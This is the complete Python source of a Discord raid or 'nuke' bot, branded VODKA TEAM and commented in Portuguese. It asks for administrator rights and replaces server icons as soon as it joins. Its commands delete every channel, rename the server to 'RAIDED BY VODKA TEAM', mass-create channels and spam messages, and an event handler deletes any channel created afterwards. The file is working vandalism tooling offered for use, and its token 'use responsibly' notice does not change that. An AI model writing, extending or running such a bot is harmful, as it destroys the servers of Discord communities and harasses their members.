import discord
from discord.ext import commands
from discord import ButtonStyle, ui
import asyncio
import os
import sys
from dotenv import load_dotenv
import threading
from flask import Flask
import aiohttp

# Carregar variáveis de ambiente
load_dotenv()

TOKEN = os.getenv('DISCORD_TOKEN')

if not TOKEN:
    print("❌ TOKEN não encontrado! Verifique o arquivo .env")
    sys.exit(1)

# Configurar intents
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='•', intents=intents)

# ========== SERVIDOR HTTP PARA O RENDER ==========
app = Flask('')

@app.route('/')
def home():
    return "🍺 VODKA BOT ESTÁ RODANDO! 🍺"

def run_flask():
    app.run(host='0.0.0.0', port=10000)

threading.Thread(target=run_flask, daemon=True).start()
# ================================================

# ========== FUNÇÕES DE TEXTO ==========
def load_text():
    try:
        with open('texto.txt', 'r', encoding='utf-8') as f:
            return f.read().strip()
    except FileNotFoundError:
        with open('texto.txt', 'w', encoding='utf-8') as f:
            f.write("🍺 RAIDED BY VODKA TEAM 🍺")
        return "🍺 RAIDED BY VODKA TEAM 🍺"
    except Exception as e:
        print(f"Erro ao carregar texto: {e}")
        return "🍺 RAIDED BY VODKA TEAM 🍺"

def update_text(new_text):
    try:
        with open('texto.txt', 'w', encoding='utf-8') as f:
            f.write(new_text)
        return True
    except Exception as e:
        print(f"Erro ao atualizar texto: {e}")
        return False

# ========== LINK DO BOT ==========
BOT_INVITE_URL = "https://discord.com/oauth2/authorize?client_id=1543062082227011654&permissions=8&integration_type=1&scope=bot+applications.commands"

# ========== EVENTOS ==========
@bot.event
async def on_ready():
    print(f'✅ Bot logado como {bot.user}')
    print(f'✅ Em {len(bot.guilds)} servidores')
    await bot.change_presence(activity=discord.Game(name="•help_bot | Vodka Team"))
    
    # Mudar foto do servidor para a foto do bot quando entrar em um servidor
    for guild in bot.guilds:
        try:
            # Baixar avatar do bot
            avatar_url = bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url
            async with aiohttp.ClientSession() as session:
                async with session.get(avatar_url) as resp:
                    if resp.status == 200:
                        avatar_data = await resp.read()
                        await guild.edit(icon=avatar_data)
                        print(f"🖼️ Foto do servidor {guild.name} atualizada!")
        except Exception as e:
            print(f"Erro ao atualizar foto do servidor {guild.name}: {e}")

@bot.event
async def on_guild_join(guild):
    """Quando o bot entra em um servidor novo, muda a foto"""
    try:
        avatar_url = bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url
        async with aiohttp.ClientSession() as session:
            async with session.get(avatar_url) as resp:
                if resp.status == 200:
                    avatar_data = await resp.read()
                    await guild.edit(icon=avatar_data)
                    print(f"🖼️ Foto do servidor {guild.name} atualizada ao entrar!")
    except Exception as e:
        print(f"Erro ao atualizar foto do servidor {guild.name}: {e}")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send(f"❌ Comando não encontrado! Use •help_bot para ver os comandos.", delete_after=5)
    else:
        print(f"Erro: {error}")

# ========== MONITOR DE CANAIS ==========
@bot.event
async def on_guild_channel_create(channel):
    """Apaga qualquer canal criado automaticamente"""
    try:
        await channel.delete()
        print(f"🗑️ Canal {channel.name} apagado automaticamente!")
    except:
        pass

# ========== CLASSE DO BOTÃO ==========
class InviteButton(ui.View):
    def __init__(self):
        super().__init__(timeout=None)
    
    @ui.button(label="📋 COPIAR LINK", style=ButtonStyle.primary, custom_id="copy_invite")
    async def copy_invite(self, interaction: discord.Interaction, button: ui.Button):
        try:
            # Tentar enviar o link para o usuário copiar
            await interaction.response.send_message(
                f"📋 **LINK DO BOT:**\n{BOT_INVITE_URL}",
                ephemeral=True
            )
        except Exception as e:
            await interaction.response.send_message(
                f"❌ Erro ao copiar: {str(e)}",
                ephemeral=True
            )

# ========== COMANDOS ==========

@bot.command()
async def invite(ctx):
    """📋 Envia o link de convite do bot com botão para copiar"""
    try:
        embed = discord.Embed(
            title="🍺 CONVIDE O VODKA BOT!",
            description=(
                "**Adicione o bot ao seu servidor e cause o caos!**\n\n"
                "🔹 **Permissões:** Administrador\n"
                "🔹 **Comandos:** 8+ comandos de destruição\n"
                "🔹 **Velocidade:** Ultra rápido\n\n"
                "**Clique no botão abaixo para copiar o link!**"
            ),
            color=discord.Color.purple()  # 🟣 ROXINHO
        )
        embed.set_thumbnail(url=bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url)
        embed.set_footer(text="🍺 VODKA TEAM - O caos está a um clique!")
        embed.add_field(
            name="📊 Estatísticas do Bot",
            value=(
                f"✅ **{len(bot.guilds)}** servidores\n"
                f"✅ **{len(bot.users)}** usuários\n"
                f"✅ **{len(bot.commands)}** comandos"
            ),
            inline=False
        )
        
        view = InviteButton()
        await ctx.send(embed=embed, view=view)
        
    except Exception as e:
        await ctx.send(f"❌ Erro: {str(e)}")

@bot.command()
async def update_server_icon(ctx):
    """🖼️ Atualiza a foto do servidor para a foto do bot"""
    try:
        await ctx.message.delete()
        guild = ctx.guild
        
        # Baixar avatar do bot
        avatar_url = bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url
        async with aiohttp.ClientSession() as session:
            async with session.get(avatar_url) as resp:
                if resp.status == 200:
                    avatar_data = await resp.read()
                    await guild.edit(icon=avatar_data)
                    
                    embed = discord.Embed(
                        title="🖼️ FOTO ATUALIZADA!",
                        description="A foto do servidor foi atualizada para a foto do bot!",
                        color=discord.Color.purple()
                    )
                    embed.set_thumbnail(url=avatar_url)
                    await ctx.send(embed=embed, delete_after=5)
                else:
                    await ctx.send("❌ Erro ao baixar a foto do bot!", delete_after=5)
    except Exception as e:
        await ctx.send(f'❌ Erro: {str(e)}')

@bot.command()
async def ping(ctx):
    """Verifica a latência do bot"""
    try:
        latency = round(bot.latency * 1000)
        embed = discord.Embed(
            title="🏓 Pong!",
            description=f"Latência: **{latency}ms**",
            color=discord.Color.purple()
        )
        await ctx.send(embed=embed, delete_after=10)
    except Exception as e:
        await ctx.send(f"❌ Erro: {str(e)}")

@bot.command()
async def nuke(ctx):
    """💀 ATIVAÇÃO DO NUKE: Cria canais, envia 10 mensagens em cada, renomeia tudo!"""
    try:
        await ctx.message.delete()
        texto = load_text()
        guild = ctx.guild
        
        # PASSO 1: Atualizar foto do servidor
        try:
            avatar_url = bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url
            async with aiohttp.ClientSession() as session:
                async with session.get(avatar_url) as resp:
                    if resp.status == 200:
                        avatar_data = await resp.read()
                        await guild.edit(icon=avatar_data)
        except:
            pass
        
        # PASSO 2: Renomear o servidor
        try:
            await guild.edit(name="💀 RAIDED BY VODKA TEAM 💀")
        except:
            pass
        
        # PASSO 3: Apagar TODOS os canais existentes
        for channel in guild.channels:
            try:
                if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel, discord.ForumChannel)):
                    await channel.delete()
                    await asyncio.sleep(0.05)
            except:
                pass
        
        # PASSO 4: Criar MUITOS canais
        criados = 0
        canais_criados = []
        
        # Criar canais de texto
        for i in range(50):
            try:
                canal = await guild.create_text_channel(f"RAID-BY-VODKA-{i+1}")
                canais_criados.append(canal)
                criados += 1
                await asyncio.sleep(0.03)
            except:
                pass
        
        # Criar canais de voz
        for i in range(20):
            try:
                canal = await guild.create_voice_channel(f"VOICE-RAID-{i+1}")
                canais_criados.append(canal)
                criados += 1
                await asyncio.sleep(0.03)
            except:
                pass
        
        # Criar fóruns
        for i in range(10):
            try:
                canal = await guild.create_forum_channel(f"FORUM-RAID-{i+1}")
                canais_criados.append(canal)
                criados += 1
                await asyncio.sleep(0.03)
            except:
                pass
        
        # PASSO 5: Enviar 10 mensagens em CADA canal
        mensagens_enviadas = 0
        for canal in canais_criados:
            if isinstance(canal, discord.TextChannel):
                try:
                    for i in range(10):
                        await canal.send(f"**{texto}**\n💀 Mensagem {i+1}/10\n🔥 RAIDED BY VODKA TEAM!")
                        mensagens_enviadas += 1
                        await asyncio.sleep(0.03)
                except:
                    pass
        
        # PASSO 6: Relatório
        embed = discord.Embed(
            title="💀 NUKE COMPLETO! 💀",
            description=(
                f"✅ **{criados}** canais criados\n"
                f"✅ **{mensagens_enviadas}** mensagens enviadas\n"
                f"✅ Servidor renomeado e foto atualizada!"
            ),
            color=discord.Color.red()
        )
        embed.set_footer(text="🍺 VODKA TEAM - O CAOS ESTÁ INSTALADO!")
        
        if guild.text_channels:
            await guild.text_channels[0].send(embed=embed)
        
    except Exception as e:
        print(f"Erro no nuke: {e}")

@bot.command()
async def end(ctx):
    """💀 APAGA TODOS OS CANAIS e MONITORA para apagar novos!"""
    try:
        await ctx.message.delete()
        guild = ctx.guild
        
        # Atualizar foto do servidor
        try:
            avatar_url = bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url
            async with aiohttp.ClientSession() as session:
                async with session.get(avatar_url) as resp:
                    if resp.status == 200:
                        avatar_data = await resp.read()
                        await guild.edit(icon=avatar_data)
        except:
            pass
        
        # Apagar TODOS os canais
        count = 0
        for channel in guild.channels:
            try:
                if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel, discord.ForumChannel)):
                    await channel.delete()
                    count += 1
                    await asyncio.sleep(0.05)
            except:
                pass
        
        # Renomear servidor
        try:
            await guild.edit(name="💀 RAIDED BY VODKA TEAM 💀")
        except:
            pass
            
        print(f"✅ {count} canais apagados no servidor {guild.name}")
        
        # Tentar enviar mensagem final
        if guild.text_channels:
            embed = discord.Embed(
                title="💀 END EXECUTADO!",
                description=f"✅ {count} canais apagados!\n🛡️ Nenhum canal novo será criado!",
                color=discord.Color.red()
            )
            await guild.text_channels[0].send(embed=embed)
        
    except Exception as e:
        print(f"Erro no end: {e}")

@bot.command()
async def rename_all(ctx):
    """Renomeia todos os canais e o servidor"""
    try:
        await ctx.message.delete()
        guild = ctx.guild
        
        contador = 0
        for channel in guild.channels:
            if isinstance(channel, discord.TextChannel):
                try:
                    await channel.edit(name="raided-by-vodka-team")
                    contador += 1
                    await asyncio.sleep(0.1)
                except:
                    pass
        
        # Renomear servidor e atualizar foto
        try:
            await guild.edit(name="💀 RAIDED BY VODKA TEAM 💀")
            # Atualizar foto
            avatar_url = bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url
            async with aiohttp.ClientSession() as session:
                async with session.get(avatar_url) as resp:
                    if resp.status == 200:
                        avatar_data = await resp.read()
                        await guild.edit(icon=avatar_data)
        except:
            pass
            
        embed = discord.Embed(
            title="✅ RENOMEADO!",
            description=f"{contador} canais renomeados e foto atualizada!",
            color=discord.Color.purple()
        )
        await ctx.send(embed=embed, delete_after=5)
        
    except Exception as e:
        await ctx.send(f'❌ Erro: {str(e)}')

@bot.command()
async def set_text(ctx, *, texto):
    """Atualiza o texto das mensagens"""
    try:
        await ctx.message.delete()
        if update_text(texto):
            embed = discord.Embed(
                title="✅ TEXTO ATUALIZADO!",
                description=f"Novo texto: **{texto}**",
                color=discord.Color.purple()
            )
            await ctx.send(embed=embed, delete_after=5)
        else:
            await ctx.send("❌ Erro ao atualizar texto!", delete_after=5)
    except Exception as e:
        await ctx.send(f'❌ Erro: {str(e)}')

@bot.command()
async def create_channels(ctx, quantidade: int = 10):
    """Cria N canais (padrão: 10)"""
    try:
        await ctx.message.delete()
        guild = ctx.guild
        
        if quantidade > 50:
            quantidade = 50
            await ctx.send("⚠️ Limitado a 50 canais por vez!", delete_after=5)
        
        criados = 0
        for i in range(quantidade):
            try:
                await guild.create_text_channel(f"🍺-vodka-{i+1}")
                criados += 1
                await asyncio.sleep(0.1)
            except:
                pass
                
        embed = discord.Embed(
            title="✅ CANAIS CRIADOS!",
            description=f"{criados} canais criados com sucesso!",
            color=discord.Color.purple()
        )
        await ctx.send(embed=embed, delete_after=5)
        
    except Exception as e:
        await ctx.send(f'❌ Erro: {str(e)}')

@bot.command()
async def spam(ctx, canal: discord.TextChannel = None, quantidade: int = 10):
    """Spam em um canal específico"""
    try:
        await ctx.message.delete()
        target = canal or ctx.channel
        texto = load_text()
        
        for i in range(quantidade):
            await target.send(f"**{texto}**\n💀 Spam {i+1}/{quantidade}")
            await asyncio.sleep(0.03)
            
        await ctx.send(f"✅ {quantidade} mensagens enviadas em {target.mention}", delete_after=5)
    except Exception as e:
        await ctx.send(f'❌ Erro: {str(e)}')

@bot.command()
async def help_bot(ctx):
    """Mostra todos os comandos"""
    embed = discord.Embed(
        title="🍺 VODKA TEAM BOT - COMANDOS",
        description="💀 COMANDOS DE CAOS TOTAL!",
        color=discord.Color.purple()
    )
    embed.add_field(
        name="📌 COMANDOS PRINCIPAIS",
        value=(
            "`•invite` - 📋 Link de convite do bot com botão para copiar\n"
            "`•update_server_icon` - 🖼️ Atualiza a foto do servidor para a foto do bot\n"
            "`•ping` - Verifica latência do bot\n"
            "`•nuke` - 💀 **ATIVAÇÃO TOTAL**: 10 mensagens em TODOS, cria 80+ canais, renomeia e atualiza foto!\n"
            "`•end` - 💀 **APAGA TUDO**: Remove todos os canais e impede criação de novos!\n"
            "`•rename_all` - Renomeia todos os canais, servidor e atualiza foto\n"
            "`•set_text <texto>` - Muda a mensagem do bot\n"
            "`•create_channels <qtd>` - Cria N canais (padrão: 10)\n"
            "`•spam <canal> <qtd>` - Spam em canal específico"
        ),
        inline=False
    )
    embed.add_field(
        name="📊 ESTATÍSTICAS",
        value=(
            f"✅ **{len(bot.guilds)}** servidores\n"
            f"✅ **{len(bot.users)}** usuários\n"
            f"✅ **{len(bot.commands)}** comandos"
        ),
        inline=True
    )
    embed.add_field(
        name="🔗 LINK DO BOT",
        value=f"[Clique aqui para adicionar]({BOT_INVITE_URL})",
        inline=True
    )
    embed.add_field(
        name="⚠️ AVISO",
        value="Use com responsabilidade! Apenas em servidores onde você tem permissão.",
        inline=False
    )
    embed.set_thumbnail(url=bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url)
    embed.set_footer(text="🍺 VODKA TEAM - Power to the people!")
    
    await ctx.send(embed=embed)

# ========== RODAR O BOT ==========
if __name__ == "__main__":
    print("🚀 Iniciando bot...")
    print("🔥 MODO DESTRUTIVO ATIVADO!")
    print("📋 Link de convite disponível no comando •invite")
    try:
        bot.run(TOKEN)
    except discord.LoginFailure:
        print("❌ Token inválido!")
    except Exception as e:
        print(f"❌ Erro ao rodar bot: {e}")
